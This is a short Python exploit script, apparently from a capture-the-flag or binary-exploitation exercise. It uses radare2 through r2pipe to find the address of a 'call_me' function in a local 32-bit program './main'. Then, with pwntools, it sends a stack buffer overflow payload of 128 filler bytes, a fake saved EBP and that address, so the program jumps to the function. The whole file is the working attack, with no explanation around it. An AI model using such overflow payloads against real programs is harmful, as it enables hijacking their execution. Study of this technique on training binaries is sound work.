import r2pipe
import json
from pwn import *

CALL_ME = 0x08048486
APP = "./main"

s = process(APP)

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis
symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'call_me':
        CALL_ME = i['vaddr']
        print("call_me find on {}".format(hex(CALL_ME)))


# Uncomment for debugging
#s = process("./main")
#gdb.attach(s, 'b*0x080484af')

payload = 'A'*128
payload += 'BBBB' # EBP
payload += p32(CALL_ME)
payload += p32(0x41414141) # RET

payload += '\n'
s.send(payload)
print(s.recv())
s.close()